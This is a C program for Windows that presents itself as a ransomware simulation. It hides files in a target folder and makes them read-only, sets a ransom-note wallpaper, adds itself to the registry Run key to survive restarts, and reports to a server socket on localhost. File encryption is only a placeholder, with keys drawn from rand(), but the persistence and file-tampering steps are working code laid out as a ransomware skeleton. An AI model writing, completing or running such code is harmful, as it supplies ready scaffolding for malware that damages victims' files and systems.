#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib") // Link WinSock library

// Constants
#define MAX_PATH_LEN 260
#define KEY_SIZE 32
#define IV_SIZE 16

// Struct for storing file encryption keys and IV
typedef struct {
    char filename[MAX_PATH_LEN];
    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
} KeyData;

// Function Prototypes
void scan_and_encrypt(const char* folder_path);
void set_ransom_wallpaper(const char* image_path);
void add_to_startup();
void send_message_to_server(const char* message);

// Helper functions
void generate_key_and_iv(unsigned char* key, unsigned char* iv);
void encrypt_file(const char* filename, unsigned char* key, unsigned char* iv);

int main() {
    // Example folder for scanning
    const char* folder_to_scan = "C:\\TestFolder";

    // Example wallpaper image path
    const char* wallpaper_path = "C:\\ransom_note.bmp";

    printf("Starting ransomware simulation...\n");

    // 1. Scan and encrypt files
    scan_and_encrypt(folder_to_scan);

    // 2. Set ransom note as wallpaper
    set_ransom_wallpaper(wallpaper_path);

    // 3. Add program to startup
    add_to_startup();

    // 4. Simulate communication with a server
    send_message_to_server("Files have been encrypted.");

    printf("Ransomware simulation completed.\n");
    return 0;
}

// 1. Scan and encrypt files
void scan_and_encrypt(const char* folder_path) {
    WIN32_FIND_DATA find_data;
    HANDLE hFind;
    char search_path[MAX_PATH_LEN];

    snprintf(search_path, MAX_PATH_LEN, "%s\\*", folder_path);
    hFind = FindFirstFile(search_path, &find_data);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error: Unable to access folder.\n");
        return;
    }

    do {
        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char full_path[MAX_PATH_LEN];
            snprintf(full_path, MAX_PATH_LEN, "%s\\%s", folder_path, find_data.cFileName);

            // Generate key and IV
            unsigned char key[KEY_SIZE], iv[IV_SIZE];
            generate_key_and_iv(key, iv);

            // Encrypt file
            encrypt_file(full_path, key, iv);

            // Mark file as hidden and read-only
            SetFileAttributes(full_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);

            printf("Encrypted and secured file: %s\n", full_path);
        }
    } while (FindNextFile(hFind, &find_data) != 0);

    FindClose(hFind);
}

// Helper to generate random key and IV
void generate_key_and_iv(unsigned char* key, unsigned char* iv) {
    for (int i = 0; i < KEY_SIZE; i++) {
        key[i] = rand() % 256;
    }
    for (int i = 0; i < IV_SIZE; i++) {
        iv[i] = rand() % 256;
    }
}

// Simulated file encryption function
void encrypt_file(const char* filename, unsigned char* key, unsigned char* iv) {
    printf("Simulating encryption for file: %s\n", filename);
    // Placeholder for actual encryption logic
}

// 2. Dynamically set wallpaper
void set_ransom_wallpaper(const char* image_path) {
    if (SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        printf("Ransom note set as wallpaper: %s\n", image_path);
    }
    else {
        printf("Failed to set wallpaper.\n");
    }
}

// 3. Add program to startup
void add_to_startup() {
    HKEY hKey;
    const char* reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* app_name = "RansomSim";
    char exe_path[MAX_PATH_LEN];

    GetModuleFileName(NULL, exe_path, MAX_PATH_LEN);

    if (RegOpenKeyEx(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, app_name, 0, REG_SZ, (const BYTE*)exe_path, strlen(exe_path) + 1) == ERROR_SUCCESS) {
            printf("Added to startup: %s\n", exe_path);
        }
        else {
            printf("Failed to set registry key value.\n");
        }
        RegCloseKey(hKey);
    }
    else {
        printf("Failed to open registry key.\n");
    }
}

// 4. Simple server communication
void send_message_to_server(const char* message) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed.\n");
        return;
    }

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        WSACleanup();
        return;
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection to server failed.\n");
        closesocket(s);
        WSACleanup();
        return;
    }

    send(s, message, strlen(message), 0);
    printf("Message sent to server: %s\n", message);

    closesocket(s);
    WSACleanup();
}

